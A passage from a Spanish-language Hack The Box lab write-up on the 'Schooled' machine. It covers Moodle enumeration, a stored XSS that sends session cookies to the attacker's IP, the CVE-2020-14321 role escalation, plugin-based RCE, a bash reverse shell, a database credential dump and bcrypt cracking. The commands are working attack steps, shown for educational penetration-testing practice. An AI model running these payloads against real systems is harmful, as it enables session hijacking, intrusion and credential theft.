200      GET        5l       50w     1366c http://10.10.10.234/images/search-icon.png
200      GET       79l      287w    18516c http://10.10.10.234/images/img-03.jpg
200      GET      104l      538w    21523c http://10.10.10.234/images/img-04.jpg
200      GET       77l      348w    19095c http://10.10.10.234/images/img-02.jpg
200      GET       60l      465w    39366c http://10.10.10.234/images/world-map.png
200      GET       94l      573w    44104c http://10.10.10.234/images/blog_2.jpg
200      GET       69l      405w    29844c http://10.10.10.234/images/blog_1.jpg
200      GET       82l      369w    33799c http://10.10.10.234/images/about_03.jpg
200      GET       89l      535w    40621c http://10.10.10.234/images/blog_5.jpg
200      GET      144l      739w    44395c http://10.10.10.234/images/team-02.png
200      GET      156l      932w    54249c http://10.10.10.234/images/team-04.png
301      GET        7l       20w      234c http://10.10.10.234/fonts <span class="o">=&gt;</span> http://10.10.10.234/fonts/
200      GET      212l     1045w    61692c http://10.10.10.234/images/team-01.png
200      GET      115l      651w    59462c http://10.10.10.234/images/blog_6.jpg
200      GET      538l     1359w    64664c http://10.10.10.234/images/banner.jpg
200      GET      120l      846w    59608c http://10.10.10.234/images/about_02.jpg
200      GET      114l      638w    56719c http://10.10.10.234/images/blog_3.jpg
200      GET      110l      835w    63659c http://10.10.10.234/images/blog_4.jpg
200      GET      200l     1040w    86799c http://10.10.10.234/images/blog_single.jpg
200      GET        7l       48w     2558c http://10.10.10.234/images/prettyPhoto/light_rounded/btnPrevious.png
200      GET        7l       54w     2072c http://10.10.10.234/images/prettyPhoto/default/default_thumb.png
200      GET        5l       78w     5660c http://10.10.10.234/fonts/Flaticon.woff
200      GET        1l        5w      376c http://10.10.10.234/images/prettyPhoto/light_rounded/default_thumbnail.gif
200      GET       69l      357w     5822c http://10.10.10.234/fonts/Flaticon.eot
200      GET       69l      354w     5637c http://10.10.10.234/fonts/Flaticon.ttf
200      GET       29l      179w     3935c http://10.10.10.234/images/prettyPhoto/dark_square/loader.gif
200      GET       16l       92w     6221c http://10.10.10.234/images/prettyPhoto/light_square/sprite.png
200      GET        7l       48w     2558c http://10.10.10.234/images/prettyPhoto/light_square/btnPrevious.png
200      GET        1l        5w      376c http://10.10.10.234/images/prettyPhoto/light_square/default_thumbnail.gif
200      GET       29l      179w     3935c http://10.10.10.234/images/prettyPhoto/dark_rounded/loader.gif
200      GET        4l       44w     1230c http://10.10.10.234/images/prettyPhoto/default/sprite_y.png
200      GET        1l        5w      376c http://10.10.10.234/images/prettyPhoto/dark_square/default_thumbnail.gif
200      GET       18l      102w     7258c http://10.10.10.234/images/prettyPhoto/light_rounded/sprite.png
200      GET       12l       37w     2531c http://10.10.10.234/images/prettyPhoto/light_square/btnNext.png
200      GET       29l      179w     3989c http://10.10.10.234/images/prettyPhoto/light_rounded/loader.gif
200      GET       29l      179w     3989c http://10.10.10.234/images/prettyPhoto/light_square/loader.gif
200      GET       12l       37w     2531c http://10.10.10.234/images/prettyPhoto/light_rounded/btnNext.png
200      GET       16l       92w     6221c http://10.10.10.234/images/prettyPhoto/dark_square/sprite.png
200      GET        3l        8w      181c http://10.10.10.234/images/prettyPhoto/facebook/contentPatternTop.png
200      GET        3l        9w      182c http://10.10.10.234/images/prettyPhoto/facebook/contentPatternBottom.png
200      GET       18l       95w     7558c http://10.10.10.234/images/prettyPhoto/facebook/sprite.png
200      GET        7l       25w     1489c http://10.10.10.234/images/prettyPhoto/facebook/btnNext.png
200      GET        7l       25w     1418c http://10.10.10.234/images/prettyPhoto/facebook/btnPrevious.png
200      GET      138l     2312w    23972c http://10.10.10.234/fonts/Flaticon.svg
200      GET        3l        8w      181c http://10.10.10.234/images/prettyPhoto/facebook/contentPatternLeft.png
200      GET        3l        9w      184c http://10.10.10.234/images/prettyPhoto/facebook/contentPatternRight.png
</code></pre></div></div>

<h2 id="moodle">Moodle</h2>

<ul>
  <li>
    <p>No vemos nada algo que podemos hacer es buscar si hay subdominios.</p>
  </li>
  <li>
    <p>Encontramos <code class="language-plaintext highlighter-rouge">moodle</code> <a href="https://www.maximaformacion.es/blog-teleformacion/que-es-la-plataforma-moodle-y-para-que-sirve-2/">https://www.maximaformacion.es/blog-teleformacion/que-es-la-plataforma-moodle-y-para-que-sirve-2/</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hh</span><span class="o">=</span>20750 <span class="nt">-u</span> http://10.10.10.234 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.schooled.htb"</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://10.10.10.234/
Total requests: 19966

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                        
<span class="o">=====================================================================</span>

000000162:   200        1 L      5 W        84 Ch       <span class="s2">"moodle"</span>                  
</code></pre></div></div>

<ul>
  <li>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.10.234 moodle.schooled.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.10.234 moodle.schooled.htb
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/2.png" />
</p>

<ul>
  <li>Si queremos hacer algo en el <code class="language-plaintext highlighter-rouge">Moodle</code> nos pide iniciar sesión.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/3.png" />
</p>

<ul>
  <li>
    <p>Si buscamos como enumerar un <code class="language-plaintext highlighter-rouge">Moodle</code> encontramos el siguiente recurso <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/moodle">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/moodle</a>.</p>
  </li>
  <li>
    <p>Vemos que solo encontramos la siguiente información <a href="https://github.com/SamJoan/droopescan">https://github.com/SamJoan/droopescan</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./droopescan scan moodle <span class="nt">-u</span> http://moodle.schooled.htb/moodle
<span class="o">[</span>+] Plugins found:                                                              
    forum http://moodle.schooled.htb/moodle/mod/forum/
        http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt
        http://moodle.schooled.htb/moodle/mod/forum/version.php

<span class="o">[</span>+] No themes found.

<span class="o">[</span>+] Possible version<span class="o">(</span>s<span class="o">)</span>:
    3.10.0-beta

<span class="o">[</span>+] Possible interesting urls found:
    Static readme file. - http://moodle.schooled.htb/moodle/README.txt
    Admin panel - http://moodle.schooled.htb/moodle/login/

<span class="o">[</span>+] Scan finished <span class="o">(</span>0:00:08.210147 elapsed<span class="o">)</span>

</code></pre></div></div>

<ul>
  <li>Para poder enumerar mas a fondo vamos a registrarnos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/4.png" />
</p>

<ul>
  <li>Vemos que nos da un error y nos dice que solo acepta correos de ese dominio.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/5.png" />
</p>

<ul>
  <li>Una vez creada la cuenta vemos lo siguiente.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/6.png" />
</p>

<ul>
  <li>Si nos inscribimos a un curso encontramos muchos participantes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/7.png" />
</p>

<ul>
  <li>Si vamos a los <strong>Reminders</strong> vemos que Manuel Philips nos deja esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/8.png" />
</p>

<ul>
  <li>Nos dice que necesitamos un <code class="language-plaintext highlighter-rouge">MoodleNet</code> Profile <a href="https://moodle.com/es/news/moodlenet-what-is-a-federated-social-network/">https://moodle.com/es/news/moodlenet-what-is-a-federated-social-network/</a>.</li>
</ul>

<h2 id="shell-as-www">Shell as www</h2>

<ul>
  <li>
    <p>Si buscamos alguna vulnerabilidad relacionada con esto, en la pagina de <code class="language-plaintext highlighter-rouge">moodle</code> nos comparten que es posible hacer un XSS mediante un parámetro en el <code class="language-plaintext highlighter-rouge">user profile</code> <a href="https://moodle.org/mod/forum/discuss.php?d=410839#p1657001">https://moodle.org/mod/forum/discuss.php?d=410839#p1657001</a>.</p>
  </li>
  <li>
    <p>Si nos vamos a editar nuestro perfil encontramos una parte donde nos dice <code class="language-plaintext highlighter-rouge">MoodleNet profile</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/9.png" />
</p>

<ul>
  <li>Como es un XSS <a href="https://book.hacktricks.xyz/es/pentesting-web/xss-cross-site-scripting">https://book.hacktricks.xyz/es/pentesting-web/xss-cross-site-scripting</a> vamos a insertar una etiqueta para ver si obtenemos una petición a nuestro servidor.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"http://10.10.14.13/GG.js"</span><span class="o">&gt;</span>&lt;/script&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/10.png" />
</p>

<ul>
  <li>Si le damos a <code class="language-plaintext highlighter-rouge">Update Profile</code> obtenemos la petición.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.14.13 - - <span class="o">[</span>10/Oct/2024 18:16:00] code 404, message File not found
10.10.14.13 - - <span class="o">[</span>10/Oct/2024 18:16:00] <span class="s2">"GET /GG.js HTTP/1.1"</span> 404 -
10.10.10.234 - - <span class="o">[</span>10/Oct/2024 18:16:10] code 404, message File not found
10.10.10.234 - - <span class="o">[</span>10/Oct/2024 18:16:10] <span class="s2">"GET /GG.js HTTP/1.1"</span> 404 -
</code></pre></div></div>

<ul>
  <li>Con esta vulnerabilidad podemos robar Cookies de sesión podemos hacer un <code class="language-plaintext highlighter-rouge">.js</code> que haga un <code class="language-plaintext highlighter-rouge">request</code> de la <code class="language-plaintext highlighter-rouge">cookie</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>GG.js
var request <span class="o">=</span> new XMLHttpRequest<span class="o">()</span><span class="p">;</span>
request.open<span class="o">(</span><span class="s1">'GET'</span>, <span class="s1">'http://10.10.14.13/?cookie='</span> + document.cookie<span class="o">)</span><span class="p">;</span>
request.send<span class="o">()</span><span class="p">;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a volver a inyectar la misma etiqueta para ver si nos llega una <code class="language-plaintext highlighter-rouge">Cookie</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.234 - - <span class="o">[</span>10/Oct/2024 18:22:23] <span class="s2">"GET /GG.js HTTP/1.1"</span> 200 -
10.10.10.234 - - <span class="o">[</span>10/Oct/2024 18:22:23] <span class="s2">"GET /?cookie=MoodleSession=f0f3evpeu3u7bmj1ves48hfrt4 HTTP/1.1"</span> 200 -
10.10.14.13 - - <span class="o">[</span>10/Oct/2024 18:22:25] <span class="s2">"GET /GG.js HTTP/1.1"</span> 200 -
10.10.14.13 - - <span class="o">[</span>10/Oct/2024 18:22:25] <span class="s2">"GET /?cookie=MoodleSession=hpo7nmn5ui79m0cfqdo14akfgi HTTP/1.1"</span> 200 -
</code></pre></div></div>

<ul>
  <li>Una ves cambiamos la <code class="language-plaintext highlighter-rouge">Cookie</code> simplemente recargamos la pagina.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/11.png" />
</p>

<ul>
  <li>Y ya estamos como otro usuario.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/12.png" />
</p>

<ul>
  <li>
    <p>Bueno realmente no encontramos nada interesante pero si buscamos en Github encontramos esto que es interesante <a href="https://github.com/HoangKien1020/CVE-2020-14321/tree/master">https://github.com/HoangKien1020/CVE-2020-14321/tree/master</a> podemos obtener RCE a partir de subir un .zip y al parecer para obtener privilegios de Manager le inyecta todo el <code class="language-plaintext highlighter-rouge">payload</code> que deja abajo en el repositorio.</p>
  </li>
  <li>
    <p>El problema es que nos tenemos que convertir en un usuario que sea Manager y una de ellos como lo vimos en la pagina web principal es <code class="language-plaintext highlighter-rouge">Lianne Carter</code> .</p>
  </li>
  <li>
    <p>Si le damos en <code class="language-plaintext highlighter-rouge">Enrol Users</code> podemos ver que si existe.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/13.png" />
</p>

<ul>
  <li>
    <p>Una vez añadido el usuario no podemos convertirnos en el pero en <code class="language-plaintext highlighter-rouge">Moodle</code> hay una opción para poder convertirnos en otro usuario.</p>
  </li>
  <li>
    <p>Ahora vamos a capturar la petición con <code class="language-plaintext highlighter-rouge">BurpSuite</code> a la hora de añadir al usuario <strong>Hay que eliminarlo primero otra vez</strong>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/14.png" />
</p>

<ul>
  <li>
    <p>Ahora si vemos hay un parámetro que se llama <code class="language-plaintext highlighter-rouge">roletoassing</code> vamos a cambiarlo a 1 ya que casi siempre es el del admin, aparte vemos uno que se llama <code class="language-plaintext highlighter-rouge">userlist</code> que es el 25 pero nosotros somos el 24 puedes comprobarlo yendo a tu perfil .</p>
  </li>
  <li>
    <p>Ahora simplemente le damos a Send.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/15.png" />
</p>

<ul>
  <li>Funciono.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/16.png" />
</p>

<ul>
  <li>
    <p>Ahora hacemos un Forward y vemos esto: “en caso de no funcionarte no lo hagas desde el repeater”.</p>
  </li>
  <li>
    <p>Si lo volvemos añadir vemos que ahora nos aparece esto.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/17.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/18.png" />
</p>

<ul>
  <li>No podemos instalar <code class="language-plaintext highlighter-rouge">Plugins</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/19.png" />
</p>

<ul>
  <li>
    <p>Si regresamos al <code class="language-plaintext highlighter-rouge">POC</code> recordemos que inyecta un <code class="language-plaintext highlighter-rouge">Payload</code> para obtener full <code class="language-plaintext highlighter-rouge">permissions</code> así que nos falta eso.</p>
  </li>
  <li>
    <p>Ahora le damos <code class="language-plaintext highlighter-rouge">click</code> en Manager.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/20.png" />
</p>

<ul>
  <li>Después le damos en <code class="language-plaintext highlighter-rouge">Edit</code> y vamos a capturar a la hora de hacer <code class="language-plaintext highlighter-rouge">Save Changes</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/burp.png" />
</p>

<ul>
  <li>Ahora cambiamos todo el <code class="language-plaintext highlighter-rouge">payload</code> por el que esta en Github.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/payload.png" />
</p>

<ul>
  <li>Ahora al darle a <code class="language-plaintext highlighter-rouge">Send</code> vemos que ya podemos instalar plugins.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/GG.png" />
</p>

<ul>
  <li>
    <p>Ahora en <code class="language-plaintext highlighter-rouge">Plugins</code> vamos a subir el .zip que nos dicen en el POC.</p>
  </li>
  <li>
    <p>Después de subirlo tenemos RCE.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd<span class="o">=</span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
</code></pre></div></div>

<ul>
  <li>Enviamos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s2">"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.13/443 0&gt;&amp;1'"</span> http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php
</code></pre></div></div>

<ul>
  <li>Recibimos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.13] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234] 52493
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1132<span class="o">)</span>: Can<span class="s1">'t assign requested address
bash: no job control in this shell
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ whoami
www
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ 
</span></code></pre></div></div>

<h2 id="shell-as--jamie">Shell as  jamie</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>www@Schooled /]<span class="nv">$ </span>/usr/local/bin/python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>
/usr/local/bin/python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>
<span class="o">[</span>www@Schooled /]<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-nlvp</span> 443
                                                       
❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg
</span>reset xterm
ENTER
</code></pre></div></div>

<ul>
  <li>Vemos la contraseña para la base de datos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>www@Schooled /usr/local/www/apache24/data/moodle]<span class="nv">$ </span><span class="nb">cat </span>config.php
&lt;?php  // Moodle configuration file

<span class="nb">unset</span><span class="o">(</span><span class="nv">$CFG</span><span class="o">)</span><span class="p">;</span>
global <span class="nv">$CFG</span><span class="p">;</span>
<span class="nv">$CFG</span> <span class="o">=</span> new stdClass<span class="o">()</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;dbtype    <span class="o">=</span> <span class="s1">'mysqli'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dblibrary <span class="o">=</span> <span class="s1">'native'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbhost    <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbname    <span class="o">=</span> <span class="s1">'moodle'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbuser    <span class="o">=</span> <span class="s1">'moodle'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbpass    <span class="o">=</span> <span class="s1">'PlaybookMaster2020'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;prefix    <span class="o">=</span> <span class="s1">'mdl_'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dboptions <span class="o">=</span> array <span class="o">(</span>
  <span class="s1">'dbpersist'</span> <span class="o">=&gt;</span> 0,
  <span class="s1">'dbport'</span> <span class="o">=&gt;</span> 3306,
  <span class="s1">'dbsocket'</span> <span class="o">=&gt;</span> <span class="s1">''</span>,
  <span class="s1">'dbcollation'</span> <span class="o">=&gt;</span> <span class="s1">'utf8_unicode_ci'</span>,
<span class="o">)</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;wwwroot   <span class="o">=</span> <span class="s1">'http://moodle.schooled.htb/moodle'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dataroot  <span class="o">=</span> <span class="s1">'/usr/local/www/apache24/moodledata'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;admin     <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;directorypermissions <span class="o">=</span> 0777<span class="p">;</span>

require_once<span class="o">(</span>__DIR__ <span class="nb">.</span> <span class="s1">'/lib/setup.php'</span><span class="o">)</span><span class="p">;</span>

// There is no php closing tag <span class="k">in </span>this file,
// it is intentional because it prevents trailing whitespace problems!
<span class="o">[</span>www@Schooled /usr/local/www/apache24/data/moodle]<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Nos conectamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>www@Schooled /usr/local/www/apache24/data/moodle]<span class="nv">$ </span>/usr/local/bin/mysql <span class="nt">-u</span> moodle <span class="nt">-pPlaybookMaster2020</span> moodle
mysql: <span class="o">[</span>Warning] Using a password on the <span class="nb">command </span>line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MySQL connection <span class="nb">id </span>is 788
Server version: 8.0.23 Source distribution

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

moodle@localhost <span class="o">[</span>moodle]&gt; 
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>moodle@localhost <span class="o">[</span>moodle]&gt; <span class="k">select </span>username, email, password from mdl_user<span class="p">;</span>
+-------------------+----------------------------------------+--------------------------------------------------------------+
| username          | email                                  | password                                                     |
+-------------------+----------------------------------------+--------------------------------------------------------------+
| guest             | root@localhost                         | <span class="nv">$2y$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 |
| admin             | jamie@staff.schooled.htb               | <span class="nv">$2y$10$3D</span>/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW |
| bell_oliver89     | bell_oliver89@student.schooled.htb     | <span class="nv">$2y$10$N0feGGafBvl</span>.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK |
| orchid_sheila89   | orchid_sheila89@student.schooled.htb   | <span class="nv">$2y$10$YMsy0e4x4vKq7HxMsDk</span>.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC |
| chard_ellzabeth89 | chard_elizabeth89@student.schooled.htb | <span class="nv">$2y$10$D0Hu9XehYbTxNsf</span>/uZrxXeRp/6pmT1/6A.Q2CZhbR26lCPtf68wUC |
| morris_jake89     | morris_jake89@student.schooled.htb     | <span class="nv">$2y$10$UieCKjut2IMiglWqRCkSzerF</span>.8AnR8NtOLFmDUcQa90lair7LndRy |
| heel_james89      | heel_james89@student.schooled.htb      | <span class="nv">$2y$10$sjk</span>.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim |
| nash_michael89    | nash_michael89@student.schooled.htb    | <span class="nv">$2y$10$yShrS</span>/zCD1Uoy0JMZPCDB.saWGsPUrPyQZ4eAS50jGZUp8zsqF8tu |
| singh_rakesh89    | singh_rakesh89@student.schooled.htb    | <span class="nv">$2y$10$Yd52KrjMGJwPUeDQRU7wNu6xjTMobTWq3eEzMWeA2KsfAPAcHSUPu</span> |
| taint_marcus89    | taint_marcus89@student.schooled.htb    | <span class="nv">$2y$10$kFO4L15Elng2Z2R4cCkbdOHyh5rKwnG4csQ0gWUeu2bJGt4Mxswoa</span> |
| walls_shaun89     | walls_shaun89@student.schooled.htb     | <span class="nv">$2y$10$EDXwQZ9Dp6UNHjAF</span>.ZXY2uKV5NBjNBiLx/WnwHiQ87Dk90yZHf3ga |
| smith_john89      | smith_john89@student.schooled.htb      | <span class="nv">$2y$10$YRdwHxfstP0on0Yzd2jkNe</span>/YE/9PDv/YC2aVtC97mz5RZnqsZ/5Em |
| white_jack89      | white_jack89@student.schooled.htb      | <span class="nv">$2y$10$PRy8LErZpSKT7YuSxlWntOWK</span>/5LmSEPYLafDd13Nv36MxlT5yOZqK |
| travis_carl89     | travis_carl89@student.schooled.htb     | <span class="nv">$2y$10$VO</span>/MiMUhZGoZmWiY7jQxz.Gu8xeThHXCczYB0nYsZr7J5PZ95gj9S |
| mac_amy89         | mac_amy89@student.schooled.htb         | <span class="nv">$2y$10$PgOU</span>/KKquLGxowyzPCUsi.QRTUIrPETU7q1DEDv2Dt.xAjPlTGK3i |
| james_boris89     | james_boris89@student.schooled.htb     | <span class="nv">$2y$10$N4hGccQNNM9oWJOm2uy1LuN50EtVcba</span>/1MgsQ9P/hcwErzAYUtzWq |
| pierce_allan      | pierce_allan89@student.schooled.htb    | <span class="nv">$2y$10$ia9fKz9</span>.arKUUBbaGo2FM.b7n/QU1WDAFRafgD6j7uXtzQxLyR3Zy |
| henry_william89   | henry_william89@student.schooled.htb   | <span class="nv">$2y$10$qj67d57dL</span>/XzjCgE0qD1i.ION66fK0TgwCFou9yT6jbR7pFRXHmIu |
| harper_zoe89      | harper_zoe89@student.schooled.htb      | <span class="nv">$2y$10$mnYTPvYjDwQtQuZ9etlFmeiuIqTiYxVYkmruFIh4rWFkC3V1Y0zPy</span> |
| wright_travis89   | wright_travis89@student.schooled.htb   | <span class="nv">$2y$10$XFE</span>/IKSMPg21lenhEfUoVemf4OrtLEL6w2kLIJdYceOOivRB7wnpm |
| allen_matthew89   | allen_matthew89@student.schooled.htb   | <span class="nv">$2y$10$kFYnbkwG</span>.vqrorLlAz6hT.p0RqvBwZK2kiHT9v3SHGa8XTCKbwTZq |
| sanders_wallis89  | sanders_wallis89@student.schooled.htb  | <span class="nv">$2y$10$br9VzK6V17zJttyB8jK9Tub</span>/1l2h7mgX1E3qcUbLL.GY.JtIBDG5u |
| higgins_jane      | higgins_jane@staff.schooled.htb        | <span class="nv">$2y$10$n9SrsMwmiU</span>.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2 |
| phillips_manuel   | phillips_manuel@staff.schooled.htb     | <span class="nv">$2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG</span> |
| carter_lianne     | carter_lianne@staff.schooled.htb       | <span class="nv">$2y$10$jw</span>.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe |
| parker_dan89      | parker_dan89@student.schooled.htb      | <span class="nv">$2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj</span>.fiQAZXyufW5itreQEc2IB2.OSi |
| parker_tim89      | parker_tim89@student.schooled.htb      | <span class="nv">$2y$10$YCYp8F91YdvY2QCg3Cl5r</span>.jzYxMwkwEm/QBGYIs.apyeCeRD7OD6S |
| miguelito7x       | miguel@student.schooled.htb            | <span class="nv">$2y$10$ZOlwQZ5odMhZgpHTOvoFveTAFJrw3bum5l321wLE32K7QNqxEyFR6</span> |
+-------------------+----------------------------------------+--------------------------------------------------------------+
28 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

moodle@localhost <span class="o">[</span>moodle]&gt; 

</code></pre></div></div>

<ul>
  <li>Como Jamie es una usuaria del sistema vamos a crackear su hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Created directory: /home/miguelrega7/.john
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 1024 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="o">!</span>QAZ2wsx         <span class="o">(</span>?<span class="o">)</span>     
1g 0:00:04:12 DONE <span class="o">(</span>2024-10-10 19:32<span class="o">)</span> 0.003966g/s 55.12p/s 55.12c/s 55.12C/s 110689..superpet
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 
</code></pre></div></div>

<ul>
  <li>Ahora nos conectamos por ssh.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh jamie@10.10.10.234
The authenticity of host <span class="s1">'10.10.10.234 (10.10.10.234)'</span> can<span class="s1">'t be established.
